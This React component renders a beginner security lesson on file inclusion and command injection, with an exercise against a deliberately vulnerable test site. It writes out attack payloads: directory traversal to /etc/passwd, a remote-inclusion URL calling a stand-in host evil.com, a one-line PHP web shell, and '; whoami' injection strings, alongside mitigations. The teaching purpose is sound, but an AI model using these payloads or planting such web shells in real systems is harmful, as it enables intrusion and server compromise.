import React, { useState, useCallback, useRef } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaArrowLeft,
  FaCode,
  FaList,
  FaLink,
  FaEdit,
  FaCheckCircle,
  FaRocket,
  FaBookOpen,
  FaShieldAlt,
} from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

// Define interfaces for type safety
interface UserDetails {
  id: string; // Ensure id is string to avoid TS2322
}

interface UserData {
  userDetails: UserDetails;
}

interface AuthContext {
  userData: UserData | null;
  userToken: string | null;
}

interface FormState {
  assignmentId: number;
  userId: string;
  submissionUrl: string;
  submissionType: "github" | "pdf";
}

const Deet8: React.FC = () => {
  const navigate = useNavigate();
  const { userData, userToken } = useAuth() as AuthContext;
  const inputRef = useRef<HTMLInputElement>(null);

  // State for submission field
  const [submitted, setSubmitted] = useState<boolean>(false);
  const [form, setForm] = useState<FormState>({
    assignmentId: 8, // Unique for Deet8
    userId: String(userData?.userDetails.id ?? ""), // Cast to string to fix TS2322
    submissionUrl: "",
    submissionType: "pdf", // Default to PDF for analytical report
  });

  // Handle input change for submission URL and type
  const handleInputChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
      const { name, value } = e.target;
      setForm((prev) => ({
        ...prev,
        [name]: value,
      }));
    },
    []
  );

  // Handle file upload for PDF submissions
  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) {
      alert("No file selected. Please choose a file.");
      return;
    }
    if (file.type !== "application/pdf") {
      alert("Please upload a valid PDF file.");
      return;
    }
    // Simulate file upload (replace with actual backend logic)
    const fileUrl = URL.createObjectURL(file);
    setForm((prev) => ({
      ...prev,
      submissionUrl: fileUrl,
    }));
  }, []);

  // Handle form submission
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();

      if (!form.submissionUrl) {
        alert(`Please provide a ${form.submissionType === "github" ? "GitHub link" : "PDF file"}.`);
        return;
      }

      if (!userToken) {
        alert("Authentication error. Please log in again.");
        return;
      }

      try {
        const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
          method: "POST",
          headers: {
            Authorization: `Bearer ${userToken}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify(form),
        });

        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(errorData.message || "Submission failed.");
        }

        setSubmitted(true);
        alert("Assignment submitted successfully!");
      } catch (error) {
        console.error("Submission error:", error);
        alert(`Failed to submit: ${error instanceof Error ? error.message : "Unknown error"}`);
      }
    },
    [form, userToken]
  );

  return (
    <>
      <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
        {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
          className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105 p-2"
          aria-label="Go back"
        >
          <FaArrowLeft className="mr-2 text-lg" />
          Back
        </button>

        {/* Section Heading */}
        <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center">
          <FaShieldAlt className="mr-3 text-2xl" />
          <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">
            File Inclusion & Command Injection
          </h1>
        </div>

        <div className="p-4 sm:p-6">
          {/* Introduction */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
              <FaEdit className="mr-2 text-indigo-600" />
              Introduction to File Inclusion & Command Injection
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              File Inclusion and Command Injection are critical web application vulnerabilities, often linked to the OWASP Top 10, that allow attackers to access unauthorized files or execute arbitrary system commands. Local File Inclusion (LFI) and Remote File Inclusion (RFI) enable reading sensitive files or including malicious scripts, while command injection permits running OS commands. This module covers testing LFI, RFI, and command injection using tools like Burp Suite and browser developer tools, building on skills from modules like OWASP Top 10 analysis (<code>Deet2</code>) and penetration testing (<code>Dett6</code>).
            </p>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
              Designed for beginners, this module provides detailed explanations, practical examples, and a hands-on exercise to test these vulnerabilities in a test environment. By mastering these techniques, you’ll learn to identify, exploit, and mitigate file inclusion and command injection risks, preparing you for Capture The Flag (CTF) challenges and real-world security assessments.
            </p>
          </div>

          {/* Understanding File Inclusion & Command Injection */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaCode className="mr-2 text-indigo-600" />
              Understanding File Inclusion & Command Injection
            </h2>
            <div className="space-y-6">
              {/* Local File Inclusion (LFI) */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  1. Local File Inclusion (LFI)
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  LFI occurs when a web application includes local files specified by user input without proper validation, allowing attackers to access sensitive files like <code>/etc/passwd</code>.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Impact:</strong> Exposure of sensitive data, potential code execution via log poisoning.</li>
                  <li><strong>Example:</strong> Accessing <code>/etc/passwd</code> via a URL parameter like <code>?page=../../etc/passwd</code>.</li>
                  <li><strong>Indicators:</strong> Unvalidated file inclusion, directory traversal attempts.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Vulnerable URL
http://testphp.vulnweb.com?page=../../etc/passwd

# Server Response (Vulnerable)
root:x:0:0:root:/root:/bin/bash
...

# Secure Code (PHP)
$page = basename($_GET['page']);
include("pages/$page");
`}
                </pre>
              </div>

              {/* Remote File Inclusion (RFI) */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  2. Remote File Inclusion (RFI)
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  RFI allows attackers to include remote files (e.g., malicious PHP scripts) hosted on attacker-controlled servers, often leading to remote code execution.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Impact:</strong> Remote code execution, server compromise.</li>
                  <li><strong>Example:</strong> Including a malicious script via <code>?page=http://evil.com/shell.php</code>.</li>
                  <li><strong>Indicators:</strong> Unrestricted file inclusion, no validation of external URLs.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Vulnerable URL
http://testphp.vulnweb.com?page=http://evil.com/shell.php

# Malicious shell.php
<?php system($_GET['cmd']); ?>

# Attacker Executes Command
http://testphp.vulnweb.com?page=http://evil.com/shell.php&cmd=whoami

# Secure Code (PHP)
if (!in_array($_GET['page'], ['home.php', 'about.php'])) {
  die('Invalid page');
}
include($_GET['page']);
`}
                </pre>
              </div>

              {/* Command Injection */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  3. Command Injection
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Command injection occurs when user input is passed to system commands without sanitization, allowing attackers to execute arbitrary OS commands.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Impact:</strong> Full system compromise, data exfiltration, malware deployment.</li>
                  <li><strong>Example:</strong> Injecting <code>; whoami</code> into a ping tool input to execute additional commands.</li>
                  <li><strong>Indicators:</strong> Unsanitized input in system calls, visible command output.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Vulnerable URL
http://testphp.vulnweb.com/ping?ip=127.0.0.1; whoami

# Server Response (Vulnerable)
Ping: 127.0.0.1
User: www-data

# Vulnerable Code (PHP)
system("ping -c 1 " . $_GET['ip']);

# Secure Code (PHP)
$ip = escapeshellarg($_GET['ip']);
system("ping -c 1 $ip");
`}
                </pre>
              </div>

              {/* Mitigating Vulnerabilities */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  4. Mitigating File Inclusion & Command Injection
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Preventing these vulnerabilities requires strict input validation, sanitization, and secure coding practices.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>File Inclusion:</strong> Use whitelists for allowed files, disable <code>allow_url_include</code> in PHP.</li>
                  <li><strong>Command Injection:</strong> Sanitize inputs, use safe APIs, avoid system calls.</li>
                  <li><strong>General:</strong> Apply least privilege, use WAFs, and validate all inputs.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Secure File Inclusion (PHP)
$allowed = ['home.php', 'about.php'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
  include($page);
} else {
  include('home.php');
}

# Secure Command Execution (PHP)
$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
if ($ip) {
  system("ping -c 1 " . escapeshellarg($ip));
}

# PHP Configuration
php.ini:
allow_url_fopen = Off
allow_url_include = Off
`}
                </pre>
              </div>
            </div>
          </div>

          {/* Practical Exercise */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaRocket className="mr-2 text-indigo-600" />
              Practical Exercise: Test LFI, RFI, and Command Injection
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Apply your knowledge by testing for LFI, RFI, and command injection vulnerabilities on a test web application (<code>http://testphp.vulnweb.com</code>) using Burp Suite and browser tools. Document your process and findings in a PDF report (2–3 pages), including screenshots. Optionally, submit a GitHub repository with scripts (e.g., automating LFI tests) or Burp Suite logs and a <code>README.md</code>.
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y- lud-1 space-y-3">
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Set up your environment: Install Burp Suite Community Edition and configure your browser to use its proxy (127.0.0.1:8080). Optionally, set up a local web server (e.g., <code>python -m http.server</code>) for RFI tests.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Test for LFI:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Visit <code>http://testphp.vulnweb.com</code>, identify a file inclusion parameter (e.g., <code>?page=about.php</code>).</li>
                  <li>Try a payload like <code>?page=../../etc/passwd</code> or <code>?page=/etc/passwd</code>.</li>
                  <li>Capture the request/response in Burp Suite and check for sensitive file content (e.g., <code>root:x:0:0</code>).</li>
                  <li>Take screenshots of the URL and response.</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Test for RFI:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Create a malicious PHP file (e.g., <code>shell.php</code> with <code>{`<?php system($_GET['cmd']); ?>`}</code>) and host it locally (e.g., <code>python -m http.server 8000</code>).</li>
                  <li>Try a payload like <code>?page=http://localhost:8000/shell.php</code>.</li>
                  <li>Test command execution with <code>?page=http://localhost:8000/shell.php&cmd=whoami</code>.</li>
                  <li>Capture the request/response and screenshot the output (e.g., <code>www-data</code>).</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Test for Command Injection:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Identify a form or parameter that interacts with system commands (e.g., a ping tool at <code>/ping?ip=127.0.0.1</code>).</li>
                  <li>Inject a payload like <code>127.0.0.1; whoami</code> or <code>127.0.0.1 || whoami</code>.</li>
                  <li>Capture the request/response in Burp Suite and check for command output (e.g., <code>www-data</code>).</li>
                  <li>Take screenshots of the payload and output.</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Write a 2–3 page PDF report including:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Introduction: Explain LFI, RFI, and command injection risks.</li>
                  <li>Findings: Describe one test for each vulnerability (payload, request/response, result) with screenshots.</li>
                  <li>Impact: Discuss potential consequences (e.g., data leakage, server compromise).</li>
                  <li>Mitigation: Recommend fixes (e.g., input validation, disable <code>allow_url_include</code>).</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Optional: Create a GitHub repository with scripts (e.g., Python to automate LFI/RFI tests), Burp Suite logs, or the malicious <code>shell.php</code>, including a <code>README.md</code>.
              </li>
            </ul>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4">
              Here’s a starter guide for the exercise:
            </p>
            <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
              {`# Install Burp Suite (Kali Linux)
sudo apt update
sudo apt install burpsuite

# Start Burp Suite
burpsuite &

# Configure Browser Proxy (Firefox)
# Preferences > Network Settings > Manual Proxy
# HTTP Proxy: 127.0.0.1, Port: 8080

# Test LFI
# In Burp: Proxy > Intercept > Turn on
# Visit: http://testphp.vulnweb.com?page=../../etc/passwd
# Check response for: root:x:0:0

# Test RFI
# Create shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000
# Visit: http://testphp.vulnweb.com?page=http://localhost:8000/shell.php&cmd=whoami

# Test Command Injection
# Visit: http://testphp.vulnweb.com/ping?ip=127.0.0.1; whoami
# Check response for: www-data

# Save Evidence
# In Burp: Right-click request > Save item
# Browser: Take screenshot of output

# Create Report
# Use Word/Google Docs, include screenshots
# Export as PDF
`}
            </pre>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4 italic">
              Complete the exercise, test your setup, and submit your work below! Ensure you only test authorized systems.
            </p>
          </div>

          {/* Submission Section */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaLink className="mr-2 text-indigo-600" />
              Submit Your Work
            </h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label
                  className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                  htmlFor="submissionType"
                >
                  Submission Type:
                </label>
                <select
                  name="submissionType"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                  value={form.submissionType}
                  onChange={handleInputChange}
                  aria-label="Select submission type"
                >
                  <option value="github">GitHub Repository Link</option>
                  <option value="pdf">PDF Report</option>
                </select>
              </div>
              {form.submissionType === "github" ? (
                <div>
                  <label
                    className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                    htmlFor="submissionUrl"
                  >
                    Paste Your GitHub Repository Link:
                  </label>
                  <textarea
                    name="submissionUrl"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                    rows={4}
                    placeholder="e.g., https://github.com/username/file-inclusion-lab"
                    value={form.submissionUrl}
                    onChange={handleInputChange}
                    aria-label="GitHub repository link"
                  />
                </div>
              ) : (
                <div>
                  <label
                    className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                    htmlFor="submissionFile"
                  >
                    Upload Your PDF Report:
                  </label>
                  <input
                    type="file"
                    name="submissionFile"
                    accept="application/pdf"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                    onChange={handleFileUpload}
                    ref={inputRef}
                    aria-label="Upload PDF report"
                  />
                </div>
              )}
              <button
                type="submit"
                className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
                aria-label="Submit exercise"
              >
                Submit Exercise
              </button>
            </form>
            {submitted && (
              <p className="mt-4 text-green-600 font-medium flex items-center">
                <FaCheckCircle className="mr-2" />
                Your exercise has been submitted successfully!
              </p>
            )}
          </div>

          {/* Resources */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaBookOpen className="mr-2 text-indigo-600" />
              File Inclusion & Command Injection Resources
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Enhance your skills with these recommended resources:
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://owasp.org/www-community/attacks/File_Inclusion"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  OWASP - File Inclusion
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://owasp.org/www-community/attacks/Command_Injection"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  OWASP - Command Injection
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://portswigger.net/web-security/file-path-traversal"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  PortSwigger - File Path Traversal & Command Injection Labs
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://tryhackme.com/room/fileinc"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  TryHackMe - File Inclusion & Command Injection Walkthrough
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </>
  );
};

export default Deet8;